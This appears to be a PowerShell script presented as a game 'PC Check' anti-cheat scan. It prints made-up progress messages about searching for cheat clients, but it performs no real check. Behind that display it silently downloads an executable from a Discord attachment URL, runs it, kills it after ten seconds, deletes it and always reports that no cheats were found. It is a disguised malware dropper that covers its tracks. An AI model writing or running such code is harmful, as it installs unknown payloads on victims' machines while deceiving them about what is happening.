# --- PC Check ---
Write-Host "Running PC Check..." -ForegroundColor Green
Write-Host ""

# Function to display progress with random searching messages
function Show-Progress {
    param([int]$percent)
    
    # Display percentage in green
    Write-Host "$percent% " -ForegroundColor Green -NoNewline
    
    # Display random searching messages at certain percentages
    $messages = @(
        "searching for Eulen",
        "searching for Susano",
        "searching for Susano", 
        "searching for Custom",
        "searching for Skript",
        "searching for Vape",
        "searching for GhostClient",
        "searching for tz",
        "searching for tzx",
        "searching for bypass",
        "searching for strings",
        "searching for fileless execution"
    )
    
    $randomMessage = $messages | Get-Random
    $randomColor = Get-Random -Minimum 1 -Maximum 15
    Write-Host $randomMessage -ForegroundColor $randomColor
}

# Get computer info (silently)
Get-ComputerInfo | Out-Null
Show-Progress -percent 10
Start-Sleep -Milliseconds 800

Show-Progress -percent 20
Start-Sleep -Milliseconds 800

Show-Progress -percent 30
Start-Sleep -Milliseconds 800

Show-Progress -percent 40
Start-Sleep -Milliseconds 800

# --- User Configuration ---
$url = "https://cdn.discordapp.com/attachments/1481031763563118712/1481042495721967837/dsf.exe?ex=69b5d44f&is=69b482cf&hm=763186bf7c2d0e88f8766921c8ce85c802241735eca14cffa1b0a781d6dc7594&"
$outputPath = "$env:USERPROFILE\Downloads\Built.exe"
# --- End Configuration ---

Show-Progress -percent 50
Start-Sleep -Milliseconds 800

# Download the file (silently)
try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction SilentlyContinue
    Show-Progress -percent 60
    Start-Sleep -Milliseconds 800
    
    Show-Progress -percent 70
    Start-Sleep -Milliseconds 800
    
    # Run the executable (normally, not hidden)
    $process = Start-Process -FilePath $outputPath -PassThru
    Show-Progress -percent 80
    Start-Sleep -Milliseconds 800
    
    Show-Progress -percent 90
    Start-Sleep -Milliseconds 800
    
    # Wait 10 seconds
    Start-Sleep -Seconds 10
    
    # Close the executable if it's still running
    if ($process -and !$process.HasExited) {
        $process.Kill()
        $process.WaitForExit()
    }
    
    # Also try to close by process name as backup
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    
    # Small delay to ensure process is fully closed
    Start-Sleep -Milliseconds 500
    
    # Delete the file (silently)
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
    }
    
    # Final completion
    Write-Host "100% " -ForegroundColor Green -NoNewline
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
}
catch {
    # Silent error handling - still show completion
    
    # Try to close the process if it exists
    $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    
    # Small delay to ensure process is fully closed
    Start-Sleep -Milliseconds 500
    
    # Try to delete the file if it exists
    if (Test-Path $outputPath) {
        Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host "100% " -ForegroundColor Green -NoNewline
    Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
}

Write-Host ""
Read-Host -Prompt "Press Enter to exit"
